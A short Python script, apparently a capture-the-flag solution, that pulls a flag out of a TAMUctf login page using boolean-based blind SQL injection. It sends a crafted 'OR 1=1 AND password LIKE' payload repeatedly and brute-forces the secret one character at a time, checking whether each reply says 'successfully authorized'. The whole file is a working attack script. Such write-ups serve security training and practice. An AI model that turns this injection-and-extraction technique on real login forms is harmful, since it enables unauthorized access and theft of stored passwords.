import requests
import string
import time

url_form = "http://passwordextraction.tamuctf.com/login.php"
payload = "username=foo&password=foo' OR 1=1 AND password LIKE '{}%"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded",
   "Origin": "http://passwordextraction.tamuctf.com",
   "Referer": "http://passwordextraction.tamuctf.com/"
}

found_chars = "gigem{"
while True:
    for new_char in string.printable.replace("%", "").replace("_", ""):
        attempt = found_chars + new_char
        print("[*] Attempt: '{}'.".format(attempt))
        data = payload.format(attempt)
        print("[*] Payload: {}.".format(data))
        
        page = None
        response_ok = False
        while not response_ok:
            try:
                page = requests.post(url_form, data=data, headers=headers)
                response_ok = True
            except:
                print("[!] EXCEPTION!")
                time.sleep(1 * 60)
    
        if "successfully authorized" in page.text:
            found_chars += new_char
            print("[*] Found chars: '{}'".format(found_chars))
            break
    
    if found_chars[-1] == "}":
        break
        
print("The FLAG is: {}".format(found_chars))